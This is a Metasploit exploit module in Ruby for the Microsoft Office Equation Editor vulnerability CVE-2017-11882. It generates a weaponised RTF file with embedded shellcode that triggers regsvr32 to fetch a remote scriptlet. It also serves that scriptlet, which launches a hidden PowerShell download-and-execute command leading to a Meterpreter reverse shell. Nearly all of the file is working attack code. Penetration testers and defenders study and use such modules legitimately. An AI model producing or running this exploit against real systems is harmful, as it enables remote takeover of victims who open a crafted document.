##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE


  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Microsoft Office CVE-2017-11882',
      'Description' => %q{
        Module exploits a flaw in the Equation Editor, developed
        in 2000, that allowed any OLE object to execute in a separate
        address space. Compared to original PoC, allows for a command within
        a length of 109 bytes to be executed Affects Microsoft Office word for the latest
        17 years.
      },
      'Author' => ['mumbai', 'embedi', 'BlackMathIT'],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Nov 15 2017',
      'References' => [
        ['URL', 'https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about'],
        ['URL', 'https://github.com/embedi/CVE-2017-11882'],
        ['URL', 'https://github.com/BlackMathIT/2017-11882_Generator/blob/master/2017-11882_Generator.py']
      ],
      'Platform' => 'win',
      'Arch' => [ARCH_X86, ARCH_X64],
      'Targets' => [
        ['Automatic', {} ],
      ],
      'DefaultTarget' => 0,
      'Payload' => {
        'DisableNops' => true
      },
      'DefaultOptions' => {
        'EXITFUNC' => 'thread',
        'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
      }
    ))

    register_options([
        OptString.new("FILENAME", [true, "Filename to save as"])
    ])
  end



  def generate_rtf
    header = '{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}' + "\n"
    header << '{\*\generator Riched20 6.3.9600}\viewkind4\uc1' + "\n"
    header << '\pard\sa200\sl276\slmult1\f0\fs22\lang9{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata '
    header << '01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff'
    header << '0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e007400720079000000000000000000000000000000000000000000000000000000'
    header << '00000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020ce'
    header << 'a5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000'
    header << '000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000'
    header << '000000000000001400000000000000010043006f006d0070004f0062006a0000000000000000000000000000000000000000000000000000000000000000000000'
    header << '0000000000000000000000000000120002010100000003000000ffffffff0000000000000000000000000000000000000000000000000000000000000000000000'
    header << '0001000000660000000000000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000000000000000000000000000000000'
    header << '00000000000000000000000012000201ffffffff04000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000003'
    header << '0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    header << 'ffffff0100000208000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
    header << '00000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c00000044532045'
    header << '71756174696f6e000b0000004571756174696f6e2e3300f439b2710000000000000000000000000000000000000000000000000000000000000000000000000000'
    header << "00000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n"

    footer = '0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
    footer << '4500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000'
    footer << '000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000400'
    footer << '0000C50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
    footer << '00000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000'
    footer << '0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
    footer << '0000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000'
    footer << '0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
    footer << '000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000'
    footer << '0000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C'
    footer << '4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C0000000000050000000902000000000500000002'
    footer << '0101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF'
    footer << '000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE00000000000090'
    footer << '01000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A60019016'
    footer << '0A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A00000031313131313131'
    footer << '3131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB02100007000000'
    footer << '0000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F00100'
    footer << '00030000000000' + "\n"
    footer << '}{\result{\pict{\*\picprop}\wmetafile8\picw380\pich260\picwgoal380\pichgoal260' + "\n"
    footer << "0100090000039e00000002001c0000000000050000000902000000000500000002010100000005\n"
    footer << "0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002\n"
    footer << "1200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b0000\n"
    footer << "0026060f000c004d61746854797065000020001c000000fb0280fe000000000000900100000000\n"
    footer << "0402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000\n"
    footer << "002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100\n"
    footer << "000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a\n"
    footer << "0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f00100000300\n"
    footer << "00000000\n"
    footer << "}}}\n"
    footer << '\par}' + "\n"

    shellcode = "\x1c\x00\x00\x00\x02\x00\x9e\xc4\xa9\x00\x00\x00\x00\x00\x00\x00\xc8\xa7\\\x00\xc4\xee[\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08ZZ"
    shellcode << "\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10"
    shellcode << "\x90\x90"

    payload = shellcode
    payload += [0x00402114].pack("V")
    payload += "\x00" * 2
    payload += "regsvr32 /s /n /u /i:#{get_uri}.sct scrobj.dll"
    payload = (payload + ("\x00" * (197 - payload.length))).unpack('H*').first
    payload = header + payload + footer

    rtf = File.new(datastore['FILENAME'], 'w')
    rtf.write(payload)
    rtf.close
    rtf
  end



  def gen_psh(url, *method)
    ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl

    if method.include? 'string'
      download_string = datastore['PSH-Proxy'] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))
    else
      # Random filename to use, if there isn't anything set
      random = "#{rand_text_alphanumeric 8}.exe"
      # Set filename (Use random filename if empty)
      filename = datastore['BinaryEXE-FILENAME'].blank? ? random : datastore['BinaryEXE-FILENAME']

      # Set path (Use %TEMP% if empty)
      path = datastore['BinaryEXE-PATH'].blank? ? "$env:temp" : %Q('#{datastore['BinaryEXE-PATH']}')

      # Join Path and Filename
      file = %Q(echo (#{path}+'\\#{filename}'))

      # Generate download PowerShell command
      download_string = Rex::Powershell::PshMethods.download_run(url, file)
    end

    download_and_run = "#{ignore_cert}#{download_string}"

    # Generate main PowerShell command
    return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)
  end

  def on_request_uri(cli, _request)
    if _request.raw_uri =~ /\.sct$/
      print_status("Handling initial request from #{cli.peerhost}")
      payload = gen_psh("#{get_uri}", "string")
      data = gen_sct_file(payload)
      send_response(cli, data, 'Content-Type' => 'text/plain')
    else
      print_status("Stage two requested, sending...")
      p = regenerate_payload(cli)
      data = cmd_psh_payload(p.encoded,
                       payload_instance.arch.first,
                       remove_comspec: true,
                       exec_in_place: true
      )
      send_response(cli, data, 'Content-Type' => 'application/octet-stream')
    end
  end


  def rand_class_id
    "#{Rex::Text.rand_text_hex 8}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 12}"
  end


  def gen_sct_file(command)
    # If the provided command is empty, a correctly formatted response is still needed (otherwise the system raises an error).
    if command == ''
      return %{<?XML version="1.0"?><scriptlet><registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"></registration></scriptlet>}
    # If a command is provided, tell the target system to execute it.
    else
      return %{<?XML version="1.0"?><scriptlet><registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"><script><![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("#{command}",0);]]></script></registration></scriptlet>}
    end
  end


  def primer
    generate_rtf
  end
end
